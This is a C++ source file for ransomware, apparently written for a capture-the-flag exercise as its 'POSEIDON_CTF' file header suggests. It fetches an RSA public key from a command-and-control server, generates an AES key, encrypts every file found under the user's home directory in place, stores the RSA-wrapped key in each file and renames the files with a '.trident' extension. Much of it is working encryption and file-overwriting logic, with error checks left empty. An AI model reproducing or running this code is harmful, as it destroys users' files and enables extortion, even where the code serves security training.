#include "Ransom.h"
#include "fsutils.h"
#include "ConnectC2C.h"
#include "RansomFacade.h"

#include <string>
#include <vector>
#include <iostream>
#include <locale>
#include <fstream>
#include "md5.h"

#include <openssl/rsa.h>
#include <openssl/bio.h>
#include <openssl/pem.h>
#include <openssl/rand.h>
#include <openssl/err.h>

int encrypt(unsigned char* plaintext, int plaintext_len, unsigned char* key,
	unsigned char* iv, unsigned char* ciphertext)
{
	EVP_CIPHER_CTX* ctx;

	int len;

	int ciphertext_len;

	if (!(ctx = EVP_CIPHER_CTX_new()))
	{ }

	if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv))
	{ }

	if (1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
	{ }
	ciphertext_len = len;


	if (1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len))
	{ }
	ciphertext_len += len;

	EVP_CIPHER_CTX_free(ctx);

	return ciphertext_len;
}



RansomFacade::RansomFacade(std::string const& ransom_url, uint16_t port)
{
	this->c2c = ConnectC2C(ransom_url, port);
	std::string home_dir      = get_home_directory();
	std::string computer_name = get_computer_name();

	std::string my_hash = Ransom::generate_hash(computer_name);
	std::string pub_key = this->c2c.sendRequest(my_hash);
	BIO* bo = BIO_new(BIO_s_mem());
	BIO_write(bo, pub_key.c_str(), strlen(pub_key.c_str()));
	EVP_PKEY* pkey = NULL;
	PEM_read_bio_PUBKEY(bo, &pkey, 0, 0);
	RSA* rsa = EVP_PKEY_get1_RSA(pkey);

	// generate random symmetric key
	#define  BUFF_LEN 16
	unsigned char buff[BUFF_LEN];
	int result = RAND_bytes(buff, BUFF_LEN);
	
	Ransom rans = Ransom(home_dir, rsa);

	// char* bbb = BN_bn2dec(RSA_get0_e(rsa));
	// std::cout << bbb << std::endl;
	for (const auto &r : rans.get_files()) {
		std::cout << r << std::endl;
			
		// out.write((char*)buff, sizeof(char) * BUFF_LEN);
		std::string final_content;
		// encryption

		// POSEIDON_CTF         IV           ENCRYPTED_KEY      ENCRYPTE_FILE

		//
		// POSEIDON_CTF
		//
		final_content += "POSEIDON_CTF";
		unsigned char enc_buff[32];
		memset(enc_buff, 0, 32);
		int ret = RSA_public_encrypt(BUFF_LEN, buff, enc_buff, rsa, RSA_PKCS1_PADDING);

		// IV
		unsigned char IV[16];
		result = RAND_bytes(IV, 16);
		final_content += std::string((char*)IV, 16);

		// ENCRYPTED_KEY
		final_content += std::string((char *)enc_buff, 32);

		std::ifstream inp_file(r, std::ios::binary);
		std::string inp_buffer(std::istreambuf_iterator<char>(inp_file), {});
		inp_file.close();

		unsigned char* encrypted = (unsigned char*) malloc(inp_buffer.length() + 16 * sizeof(char));
		
		int enc_len = encrypt((unsigned char*) inp_buffer.c_str(), inp_buffer.length(), buff, IV, encrypted);
		
		std::string result_encrypted((char *) encrypted, enc_len);

		final_content += result_encrypted;

		std::cout << enc_len << std::endl;
		std::fstream out(r, std::ios::out | std::ios::binary);
		out.write(final_content.c_str(), sizeof(char) * final_content.length());
		out.close();

		rename(r.c_str(), (r + ".trident").c_str());

	}

	// this->rans = Ransom(home_dir, );
}
